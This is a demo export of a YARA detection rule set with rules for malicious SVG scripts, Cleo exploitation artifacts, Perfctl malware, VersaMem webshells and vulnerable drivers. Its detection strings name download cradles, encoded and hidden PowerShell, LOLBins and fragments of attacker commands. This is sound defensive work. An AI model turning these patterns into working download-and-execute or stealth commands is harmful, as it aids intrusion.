{
    "name": "valhalla-rules.yar",
    "rule": "/*\n    VALHALLA YARA RULE SET - DEMO\n    Retrieved: 2025-04-21 19:19\n    Generated for User: demo\n    Number of Rules: 3210\n    Warning:\n        Note that the full rule set contains rules that require modules and threat hunting\n        rules with low scores (< 60) that could lead to false positives - use the Python\n        module valhallaAPI to retrieve a filtered set\n\n    This is the VALHALLA demo rule set. The content represents the 'signature-base' repository\n    in a streamlined format but lacks the rules provided by 3rd parties.\n    All rules are licensed under CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/.\n*/\n\nimport \"math\"\nimport \"pe\"\n\nrule SUSP_SVG_JS_Payload_Mar25_RID2FB6 : DEMO GEN SUSP {\n   meta:\n      description = \"Detects a suspicious SVG file that contains a JavaScript payload. This rule is a generic rule that might generate false positives. A match should be further investigated.\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2025-03-20 12:08:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2025-03-21\"\n      tags = \"DEMO, GEN, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"<svg xmlns=\" ascii fullword\n      $sx1 = \"src=\\\"data:application/ecmascript;base64,\" \n      $sx2 = \"=\\\"></script>\" \n      $ss1 = \"<script type=\\\"application/ecmascript\\\">\" \n      $ss2 = \"<svg xmlns=\\\"http://www.w3.org/2000/svg\\\" width=\\\"100%\\\" height=\\\"100%\\\">\" \n   condition: \n      $a1 in ( 0 .. 1024 ) and ( filesize < 100KB and 1 of ( $sx* ) or filesize < 1MB and 2 of ( $s* ) )\n}\n\nrule MAL_PHISH_Final_Payload_Feb25_RID310B : DEMO MAL T1203 T1566_001 {\n   meta:\n      description = \"Detects possible final payload of phishing-delivered malware, where embedded shellcode is used to decrypt and execute the payload after user-supplied password input.\"\n      author = \"X__Junior\"\n      reference = \"https://x.com/dtcert/status/1890384162818802135\"\n      date = \"2025-02-14 13:05:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%lu: %s %s\" wide\n      $s2 = \"(Direct Inbound)\" wide\n      $s3 = \"(Primary Domain)\" wide\n      $s4 = \"(Forest Tree Root\" wide\n      $s5 = \"(Native Mode)\" wide\n      $s6 = \"(In Forest)\" wide\n      $s7 = \"(None)\" wide\n   condition: \n      all of them\n}\n\nrule SUSP_Sysinternals_Desktops_Anomaly_Feb25_RID3679 : ANOMALY DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects anomalies in Sysinternals Desktops binaries\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2025-02-14 16:57:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Software\\\\Sysinternals\\\\Desktops\" wide fullword\n      $s2 = \"Sysinternals Desktops\" wide fullword\n      $s3 = \"http://www.sysinternals.com\" wide fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize > 350KB and all of them\n}\n\nrule SUSP_PE_Compromised_Certificate_Feb25_RID34C6 : DEMO EXE FILE SUSP T1203 T1566_001 {\n   meta:\n      description = \"Detects suspicious PE files signed with a certificate used in a widespread phishing attack in February 2025\"\n      author = \"Jonathan Peters\"\n      reference = \"https://x.com/DTCERT/status/1890384162818802135\"\n      date = \"2025-02-14 15:44:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, SUSP, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sb1 = { 44 B8 66 73 57 BB 95 65 1D 61 D0 61 } \n      $sb2 = { 4F 23 43 D9 61 54 B9 41 DB 0A 26 B2 } \n      $sb3 = { 40 A3 62 E3 50 68 91 19 F5 2E C3 4C } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20MB and 1 of them\n}\n\nrule SUSP_LNK_Suspicious_Folders_Jan25_RID3343 : DEMO FILE SUSP T1210 T1547_009 {\n   meta:\n      description = \"Detects link files (.LNK) with suspicious folders mentioned in the target path\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2025-01-24 14:40:21\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, SUSP, T1210, T1547_009\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"RECYCLER.BIN\\\\\" wide\n      $x2 = \"Perflogs\\\\\" wide\n   condition: \n      uint16 ( 0 ) == 0x004c and 1 of them\n}\n\nrule SUSP_LNX_ByteEncoder_Jan25_RID303F : DEMO FILE LINUX SUSP {\n   meta:\n      description = \"Detects Linux binaries that encode bytes by splitting them into upper and lower nibbles and mapping them to custom lookup tables, seen being used by SEASPY and Bluez backdoors\"\n      author = \"MalGamy (Nextron System)\"\n      reference = \"https://www.securityweek.com/newly-discovered-turla-malware-targets-linux-systems/\"\n      date = \"2025-01-23 12:31:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, LINUX, SUSP\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $op1 = {8B 45 FC 48 63 D0 48 8B 45 A8 48 01 C2 8B 45 BC C1 F8 04 83 E0 0F 48 98 0F B6 44 05 E0 88 02} \n      $op2 = {8B 45 FC 48 98 48 8D 50 01 48 8B 45 A8 48 01 C2 8B 45 BC 83 E0 0F 48 98 0F B6 44 05 C0 88 02} \n   condition: \n      uint32be ( 0 ) == 0x7f454c46 and filesize < 4MB and all of them\n}\n\nrule SUSP_LNX_StackString_Technique_Jan25_RID345D : DEMO FILE LINUX SUSP {\n   meta:\n      description = \"Detects Linux binaries using stack-based string manipulation techniques, which are often used to generate PTY (pseudo-terminal) device names for stealth or persistence, seen being used by SEASPY and Bluez backdoors\"\n      author = \"MalGamy (Nextron System)\"\n      reference = \"https://www.securityweek.com/newly-discovered-turla-malware-targets-linux-systems/\"\n      date = \"2025-01-23 15:27:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, LINUX, SUSP\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $op1 = {C7 45 E0 70 71 72 73 C7 45 E4 74 75 76 77 C7 45 E8 78 79 7A 61 C7 45 EC 62 63 64 65 C6 45 F0 00 C7 45 C0 30 31 32 33 C7 45 C4 34 35 36 37 C7 45 C8 38 39 61 62 C7 45 CC 63 64 65 66} \n   condition: \n      uint32be ( 0 ) == 0x7f454c46 and filesize < 4MB and $op1\n}\n\nrule EXPL_Cleo_Exploitation_Log_Indicators_Dec24_RID374C : DEMO EXPLOIT LOG SCRIPT {\n   meta:\n      description = \"Detects indicators found in logs during and after Cleo software exploitation (as reported by Huntress in December 2024)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 17:32:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, LOG, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Note: Processing autorun file 'autorun\\\\health\" ascii wide\n      $x2 = \"60282967-dc91-40ef-a34c-38e992509c2c.xml\" ascii wide\n      $x3 = \"<Detail level=\\\"1\\\">Executing 'cmd.exe /c \\\"powershell -NonInteractive -EncodedCommand \" ascii wide\n   condition: \n      1 of them\n}\n\nrule SUSP_EXPL_Cleo_Exploitation_Log_Indicators_Dec24_1_RID3986 : DEMO EXPLOIT LOG SUSP T1105 {\n   meta:\n      description = \"Detects indicators found in logs during and after Cleo software exploitation (as reported by Huntress in December 2024)\"\n      author = \"X__Junior\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 19:07:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"786951478a0fc5db24f6e1d8dcc5eaa8880dbd928da97828a61f1f1f0f21e21d\"\n      tags = \"DEMO, EXPLOIT, LOG, SUSP, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"<Thread type=\\\"AutoRun\\\" action=\" ascii\n      $sa2 = \"<Mark date=\" ascii\n      $sa3 = \"<Event>\" ascii\n      $sa4 = \"<Command text\" ascii\n      $sb1 = \"[System.Net.WebRequest]::create\" ascii\n      $sb2 = \"Invoke-RestMethod\" ascii\n      $sb3 = \"Invoke-WebRequest\" ascii\n      $sb4 = \"iwr \" ascii\n      $sb5 = \"Net.WebClient\" ascii\n      $sb6 = \"Resume-BitsTransfer\" ascii\n      $sb7 = \"Start-BitsTransfer\" ascii\n      $sb8 = \"wget \" ascii\n      $sb9 = \"WinHttp.WinHttpRequest\" ascii\n      $sb10 = \".DownloadFile(\" ascii\n      $sb11 = \".DownloadString(\" ascii\n      $sb12 = \"Bypass\" nocase ascii\n      $sb13 = \"-EncodedCommand\" ascii\n      $sb14 = \"-windowstyle hidden\" ascii\n      $sb15 = \" -enc \" ascii\n   condition: \n      filesize < 1MB and all of ( $sa* ) and 1 of ( $sb* )\n}\n\nrule SUSP_EXPL_Cleo_Exploitation_Log_Indicators_Dec24_2_RID3987 : DEMO EXPLOIT LOG SUSP T1033 T1053_005 T1082 T1197 T1218_010 T1218_011 {\n   meta:\n      description = \"Detects indicators found in logs during and after Cleo software exploitation (as reported by Huntress in December 2024)\"\n      author = \"X__Junior\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 19:07:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, LOG, SUSP, T1033, T1053_005, T1082, T1197, T1218_010, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"<Thread type=\\\"AutoRun\\\" action=\" ascii\n      $sa2 = \"<Mark date=\" ascii\n      $sa3 = \"<Event>\" ascii\n      $sa4 = \"<Command text\" ascii\n      $sb1 = \"wscript\" ascii\n      $sb2 = \"cscript\" ascii\n      $sb3 = \"mshta\" ascii\n      $sb4 = \"certutil\" ascii\n      $sb5 = \"pwsh\" ascii\n      $sb6 = \"curl\" ascii\n      $sb7 = \"msiexec\" ascii\n      $sb8 = \"taskkill\" ascii\n      $sb9 = \"regsvr32\" ascii\n      $sb10 = \"rundll32\" ascii\n      $sb11 = \"bitsadmin\" ascii\n      $sb12 = \"whoami\" ascii\n      $sb13 = \"bcdedit\" ascii\n      $sb14 = \"systeminfo\" ascii\n      $sb15 = \"reg \" ascii\n      $sb16 = \"schtasks\" ascii\n   condition: \n      filesize < 1MB and all of ( $sa* ) and 1 of ( $sb* )\n}\n\nrule EXPL_Cleo_Exploitation_XML_Indicators_Dec24_RID371B : DEMO EXPLOIT {\n   meta:\n      description = \"Detects XML used during and after Cleo software exploitation (as reported by Huntress in December 2024)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 17:24:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<Host alias=\\\"60282967-dc91-40ef-a34c-38e992509c2c\\\" application=\\\"\\\" \" ascii\n      $s1 = \"<Commands>SYSTEM cmd.exe /c \" ascii\n      $a1 = \"<Action actiontype=\\\"Commands\\\" \" ascii\n   condition: \n      filesize < 50KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule SUSP_EXPL_Cleo_Exploitation_XML_Indicators_Dec24_1_RID3955 : DEMO EXPLOIT SUSP T1105 {\n   meta:\n      description = \"Detects XML used during and after Cleo software exploitation (as reported by Huntress in December 2024)\"\n      author = \"X__Junior\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 18:59:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b103f708e85416fc6d7af9605da4b57b3abe42fb9c6c9ec0f539b4c877580bd2\"\n      tags = \"DEMO, EXPLOIT, SUSP, T1105\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"<Action actiontype=\\\"Commands\\\"\" ascii\n      $sa2 = \"<?xml version=\" ascii\n      $sa3 = \"<Runninglocalrequired>\" ascii\n      $sa4 = \"<Autostartup>\" ascii\n      $sb1 = \"[System.Net.WebRequest]::create\" ascii\n      $sb2 = \"Invoke-RestMethod\" ascii\n      $sb3 = \"Invoke-WebRequest\" ascii\n      $sb4 = \"iwr \" ascii\n      $sb5 = \"Net.WebClient\" ascii\n      $sb6 = \"Resume-BitsTransfer\" ascii\n      $sb7 = \"Start-BitsTransfer\" ascii\n      $sb8 = \"wget \" ascii\n      $sb9 = \"WinHttp.WinHttpRequest\" ascii\n      $sb10 = \".DownloadFile(\" ascii\n      $sb11 = \".DownloadString(\" ascii\n      $sb12 = \"Bypass\" nocase ascii\n      $sb13 = \"-EncodedCommand\" ascii\n      $sb14 = \"-windowstyle hidden\" ascii\n      $sb15 = \" -enc \" ascii\n   condition: \n      filesize < 10KB and all of ( $sa* ) and 1 of ( $sb* )\n}\n\nrule SUSP_EXPL_Cleo_Exploitation_XML_Indicators_Dec24_2_RID3956 : DEMO EXPLOIT SUSP T1033 T1053_005 T1082 T1197 T1218_010 T1218_011 {\n   meta:\n      description = \"Detects XML used during and after Cleo software exploitation (as reported by Huntress in December 2024)\"\n      author = \"X__Junior\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 18:59:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, SUSP, T1033, T1053_005, T1082, T1197, T1218_010, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"<Action actiontype=\\\"Commands\\\"\" ascii\n      $sa2 = \"<?xml version=\" ascii\n      $sa3 = \"<Runninglocalrequired>\" ascii\n      $sa4 = \"<Autostartup>\" ascii\n      $sb1 = \"wscript\" ascii\n      $sb2 = \"cscript\" ascii\n      $sb3 = \"mshta\" ascii\n      $sb4 = \"certutil\" ascii\n      $sb5 = \"pwsh\" ascii\n      $sb6 = \"curl\" ascii\n      $sb7 = \"msiexec\" ascii\n      $sb8 = \"taskkill\" ascii\n      $sb9 = \"regsvr32\" ascii\n      $sb10 = \"rundll32\" ascii\n      $sb11 = \"bitsadmin\" ascii\n      $sb12 = \"whoami\" ascii\n      $sb13 = \"bcdedit\" ascii\n      $sb14 = \"systeminfo\" ascii\n      $sb15 = \"reg \" ascii\n      $sb16 = \"schtasks\" ascii\n   condition: \n      filesize < 10KB and all of ( $sa* ) and 1 of ( $sb* )\n}\n\nrule EXPL_Cleo_Exploitation_PS1_Indicators_Dec24_RID36FE : DEMO EXPLOIT SCRIPT T1059_001 {\n   meta:\n      description = \"Detects encoded and decoded PowerShell loader used during Cleo software exploitation (as reported by Huntress in December 2024)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 17:19:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, SCRIPT, T1059_001\"\n      minimum_yara = \"4.0.0\"\n      \n   strings:\n      $xe1 = \"Start-Process -WindowStyle Hidden -FilePath jre\\\\bin\\\\java.exe\" base64 ascii wide\n      $xe2 = \"$f=\\\"cleo.\" base64 ascii wide\n      $xe3 = \"<Detail level=\\\"1\\\">Executing 'cmd.exe /c \\\"powershell -NonInteractive -EncodedCommand \" base64 ascii wide\n      $x1 = \"$f=\\\"cleo.\" ascii wide\n      $x2 = \"<Detail level=\\\"1\\\">Executing 'cmd.exe /c \\\"powershell -NonInteractive -EncodedCommand \" ascii wide\n   condition: \n      1 of them\n}\n\nrule SUSP_EXPL_JAR_Indicators_Dec24_RID3170 : DEMO EXPLOIT FILE SUSP {\n   meta:\n      description = \"Detects characteristics of JAR files used during Cleo software exploitation (as reported by Huntress in December 2024)\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 13:22:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"TLS v3 \" ascii\n      $s2 = \"java/util/Base64$Decoder\" ascii\n      $s3 = \"AES/CBC/NoPadding\" ascii\n      $s4 = \"getenv\" ascii\n      $s5 = \"ava/util/zip/ZipInputStream\" ascii\n   condition: \n      uint16 ( 0 ) == 0xfeca and filesize < 20KB and all of them\n}\n\nrule EXPL_Cleo_Exploitation_JAVA_Payloads_Dec24_1_1_RID3799 : DEMO EXPLOIT FILE {\n   meta:\n      description = \"Detects characteristics of JAVA files used during Cleo software exploitation (as reported by Huntress in December 2024) - files Cli, ScSlot, Slot, SrvSlot\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 17:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0c57b317b572d071afd8ccdb844dd6f117e20f818c6031d7ba8adcbd32be0617\"\n      tags = \"DEMO, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"java/lang/StringBuffer\" \n      $x1 = \"Start-Sleep 3;del \" ascii\n      $x2 = \"sleep 3;rm -f '\" ascii\n      $x3 = \"powershell -Noninteractive -EncodedCommand \" ascii\n      $x4 = \"runDelFileCmd\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0xfeca and filesize < 50KB and $a1 and 1 of ( $x* )\n}\n\nrule EXPL_Cleo_Exploitation_JAVA_Payloads_Dec24_2_RID370A : DEMO EXPLOIT FILE {\n   meta:\n      description = \"Detects characteristics of JAVA files used during Cleo software exploitation (as reported by Huntress in December 2024) - file Proc\"\n      author = \"Florian Roth\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 17:21:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1ba95af21bac45db43ebf02f87ecedde802c7de4d472f33e74ee0a5b5015a726\"\n      tags = \"DEMO, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Timeout getting pipe-data\" ascii fullword\n      $s2 = \"Ftprootpath\" ascii fullword\n      $s3 = \"Rest cmd=\" ascii fullword\n      $s4 = \"writeToProc\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0xfeca and filesize < 30KB and 3 of them\n}\n\nrule EXPL_Cleo_Exploitation_JAVA_Payloads_Dec24_3_RID370B : DEMO EXPLOIT FILE {\n   meta:\n      description = \"Detects characteristics of JAR files used during Cleo software exploitation\"\n      author = \"X__Junior\"\n      reference = \"https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild\"\n      date = \"2024-12-10 17:21:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"java/lang/String\" ascii\n      $s1 = \"#lsz#\" ascii\n      $s2 = \"#dbg#\" ascii\n      $s3 = \"#ll#\" ascii\n      $s4 = \"SvZipDataOverflow=%d OpNotConf=\" ascii\n   condition: \n      uint16 ( 0 ) == 0xfeca and filesize < 20KB and 3 of ( $s* ) and $a1\n}\n\nrule MAL_ELF_Xlogin_Nov24_1_RID2E79 : DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects xlogin backdoor samples\"\n      author = \"Florian Roth\"\n      reference = \"https://blog.sekoia.io/solving-the-7777-botnet-enigma-a-cybersecurity-quest/\"\n      date = \"2024-11-11 11:16:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"2b09a6811a9d0447f8c6480430eb0f7e3ff64fa933d0b2e8cd6117f38382cc6a\"\n      hash2 = \"d1cbf80786b1ca1ba2e5c31ec09159be276ad3d10fc0a8a0dbff229d8263ca0a\"\n      hash3 = \"ff17e9bcc1ed16985713405b95745e47674ec98e3c6c889df797600718a35b2c\"\n      tags = \"DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $xc1 = { 6C 6F 67 69 6E 3A 00 25 73 00 00 2F 62 69 6E 2F 73 68 00 2F 74 6D 70 2F 6C 6F 67 69 6E } \n      $s1 = \"/tmp/login\" ascii fullword\n      $s2 = \"npxXoudifFeEgGaACSnmcs[\" ascii fullword\n      $sc1 = { 28 6E 69 6C 29 00 00 00 28 6E 75 6C 6C 29 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 500KB and ( 1 of ( $x* ) or 2 of them )\n}\n\nrule SUSP_RDP_File_Indicators_Oct24_1_RID326A : DEMO SUSP T1021_001 T1203 T1566_001 {\n   meta:\n      description = \"Detects characteristics found in malicious RDP files used as email attachments in spear phishing campaigns\"\n      author = \"Florian Roth\"\n      reference = \"https://thecyberexpress.com/rogue-rdp-files-used-in-ukraine-cyberattacks/\"\n      date = \"2024-10-25 14:04:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"280fbf353fdffefc5a0af40c706377142fff718c7b87bc8b0daab10849f388d0\"\n      hash2 = \"8b45f5a173e8e18b0d5c544f9221d7a1759847c28e62a25210ad8265f07e96d5\"\n      hash3 = \"9b8cb8b01ce4eafb9204250a3c28bfaf70cc76a99ce411ad52bbf1aa2b6cce34\"\n      tags = \"DEMO, SUSP, T1021_001, T1203, T1566_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"redirectclipboard:i:1\" wide fullword\n      $s2 = \"redirectprinters:i:1\" wide fullword\n      $s3 = \"remoteapplicationmode:i:1\" wide fullword\n      $s4 = \"username:s:\" wide\n      $s5 = \"emoteapplicationicon:s:C:\\\\Windows\\\\SystemApps\" wide\n   condition: \n      filesize < 50KB and all of them\n}\n\nrule MAL_EXPL_Perfctl_Oct24_RID2E9D : DEMO EXPLOIT MAL {\n   meta:\n      description = \"Detects exploits used in relation with Perfctl malware campaigns\"\n      author = \"Florian Roth\"\n      reference = \"https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/\"\n      date = \"2024-10-09 11:22:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"22e4a57ac560ebe1eff8957906589f4dd5934ee555ebcc0f7ba613b07fad2c13\"\n      tags = \"DEMO, EXPLOIT, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Exploit failed. Target is most likely patched.\" ascii fullword\n      $s2 = \"SHELL=pkexec\" ascii fullword\n      $s3 = \"/dump_\" ascii fullword\n      $s4 = \".EYE$\" ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 30000KB and 2 of them or all of them\n}\n\nrule MAL_LNX_Perfctl_Oct24_RID2E56 : DEMO FILE LINUX MAL {\n   meta:\n      description = \"Detects Perfctl malware samples\"\n      author = \"Florian Roth\"\n      reference = \"https://www.aquasec.com/blog/perfctl-a-stealthy-malware-targeting-millions-of-linux-servers/\"\n      date = \"2024-10-09 11:10:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"a6d3c6b6359ae660d855f978057aab1115b418ed277bb9047cd488f9c7850747\"\n      hash2 = \"ca3f246d635bfa560f6c839111be554a14735513e90b3e6784bedfe1930bdfd6\"\n      tags = \"DEMO, FILE, LINUX, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $op1 = { 83 45 f8 01 8b 45 f8 48 3b 45 98 0f 82 1b ff ff ff 90 c9 c3 55 } \n      $op2 = { 48 8b 55 a0 48 01 ca 0f b6 0a 48 8b 55 a8 89 c0 88 4c 02 18 8b 45 fc 83 e0 3f } \n      $op3 = { 88 4c 10 58 83 45 f8 01 83 7d f8 03 0f 86 68 ff ff ff 90 c9 c3 55 } \n      $op4 = { 48 83 ec 68 48 89 7d a8 48 89 75 a0 48 89 55 98 48 8b 45 a8 48 8b 00 83 e0 3f 89 45 fc } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 300KB and 2 of them\n}\n\nrule WEBSHELL_JAVA_VersaMem_JAR_Aug24_2_RID3216 : DEMO FILE G1017 T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects VersaMem Java webshell samples (as used by Volt Typhoon)\"\n      author = \"Florian Roth\"\n      reference = \"https://x.com/craiu/status/1828687700884336990\"\n      date = \"2024-08-29 13:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4bcedac20a75e8f8833f4725adfc87577c32990c3783bf6c743f14599a176c37\"\n      tags = \"DEMO, FILE, G1017, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"tomcat_memShell\" ascii\n      $x2 = \"versa/vnms/ui/config/\" ascii fullword\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 3000KB and 1 of them\n}\n\nrule WEBSHELL_JAVA_VersaMem_JAR_Aug24_1_RID3215 : DEMO G1017 T1505_003 WEBSHELL {\n   meta:\n      description = \"Detects VersaMem Java webshell samples (as used by Volt Typhoon)\"\n      author = \"blacklotuslabs (modified by Florian Roth)\"\n      reference = \"https://x.com/ryanaraine/status/1828440883315999117\"\n      date = \"2024-08-27 13:50:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-08-29\"\n      tags = \"DEMO, G1017, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $sa1 = \"com.versa.vnms.ui.TestMain\" \n      $sa2 = \"captureLoginPasswordCode\" \n      $sa3 = \"com/versa/vnms/ui/services/impl/VersaAuthenticationServiceImpl\" \n      $sa4 = \"/tmp/.temp.data\" \n      $sa5 = \"getInsertCode\" \n      $sa6 = \"VersaMem\" \n      $sa7 = \"Versa-Auth\" \n      $sb1 = \"/tmp/.java_pid\" \n      $sb2 = {2f 75 73 72 2f 62 69 6e 2f 70 67 72 65 70 01 00 02 2d 66 01 00 25 6f 72 67 2e 61 70 61 63 68 65 2e 63 61 74 61 6c 69 6e 61 2e 73 74 61 72 74 75 70 2e 42 6f 6f 74 73 74 72 61 70 07} \n   condition: \n      filesize < 5MB and ( 3 of them or all of ( $sb* ) )\n}\n\nrule PUA_VULN_Driver_Cpuid_Cpuzsys_Cpuidservice_34BE_RID38AC : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:31:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00430050005500490044 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 